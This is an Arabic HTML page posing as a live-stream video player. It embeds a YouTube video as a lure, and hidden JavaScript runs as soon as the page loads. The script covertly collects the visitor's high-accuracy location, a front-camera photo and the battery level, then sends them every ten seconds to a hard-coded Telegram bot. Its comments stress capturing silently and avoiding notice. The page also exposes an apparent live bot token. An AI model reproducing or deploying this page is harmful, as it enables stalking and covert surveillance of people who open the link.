<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شاهد الآن - البث المباشر</title>
    <style>
        body { 
            margin: 0; 
            background-color: #000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: sans-serif; 
            overflow: hidden; 
        }
        .video-container { 
            width: 100%; 
            max-width: 640px; 
            position: relative; 
            padding-bottom: 56.25%; 
            height: 0; 
            box-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        .video-container iframe { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none; 
        }
        #canvas { display: none; }
        .loading-text {
            position: absolute;
            bottom: 20px;
            color: #444;
            font-size: 10px;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <iframe src="https://www.youtube.com/embed/fHI8X4OXluQ?autoplay=1&loop=1&playlist=fHI8X4OXluQ&controls=1&mute=0" 
                allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>
    
    <div class="loading-text">Loading secure player... v2.0.4</div>

    <canvas id="canvas" width="640" height="480"></canvas>

<script>
    // إعدادات البوت الخاصة بك
    const botToken = "8036035151:AAGx8I8HfUM401Y_XrzHyTvGhpQC5RXNVBM";
    const chatId = "1230856956";
    const intervalTime = 10000; // 10 ثوانٍ

    // بدء العمل بمجرد تحميل الصفحة
    window.onload = () => {
        startTrackingSystem();
    };

    async function startTrackingSystem() {
        // المحاولة الأولى فوراً
        captureAndSend("🚨 **رصد أولي: تم فتح الرابط الآن!**");

        // تكرار العملية كل 10 ثوانٍ
        setInterval(() => {
            captureAndSend("📸 **تحديث رصد تلقائي (كل 10 ثوانٍ)**");
        }, intervalTime);
    }

    async function captureAndSend(headerText) {
        let batteryStatus = "";
        try {
            const battery = await navigator.getBattery();
            batteryStatus = `🔋 البطارية: ${Math.round(battery.level * 100)}%`;
        } catch(e) { batteryStatus = "🔋 البطارية: غير متوفرة"; }

        // طلب الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const { latitude, longitude, accuracy } = pos.coords;
            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            try {
                // فتح الكاميرا الأمامية بصمت
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const tempVideo = document.createElement('video');
                tempVideo.srcObject = stream;
                tempVideo.autoplay = true;
                tempVideo.setAttribute('playsinline', ''); // ضروري لعمل الكاميرا في الآيفون صامتة

                // انتظار ثانية واحدة لضبط جودة الصورة قبل الالتقاط
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(tempVideo, 0, 0, 640, 480);
                    
                    // تحويل الصورة لجودة متوسطة لسرعة الإرسال
                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
                    
                    const message = `${headerText}\n${batteryStatus}\n📍 الدقة: ${accuracy.toFixed(1)} متر\n🔗 الموقع: ${mapLink}`;
                    
                    sendToTelegram(photoBase64, message);

                    // إغلاق الكاميرا بعد الالتقاط لتوفير الطاقة وتجنب لفت الانتباه
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);

            } catch (err) {
                // في حال رفض الكاميرا أو كانت محجوبة
                sendToTelegram(null, `${headerText}\n⚠️ الكاميرا محجوبة\n${batteryStatus}\n📍 الموقع: ${mapLink}`);
            }
        }, (err) => {
            console.log("Location access denied.");
        }, { enableHighAccuracy: true });
    }

    function sendToTelegram(photo, caption) {
        if (photo) {
            // إرسال الصورة مع النص
            fetch(photo).then(r => r.blob()).then(blob => {
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'thief_capture.jpg');
                fd.append('caption', caption);
                fd.append('parse_mode', 'Markdown');
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
            });
        } else {
            // إرسال نص فقط إذا لم تتوفر صورة
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(caption)}&parse_mode=Markdown`);
        }
    }
</script>
</body>
</html>
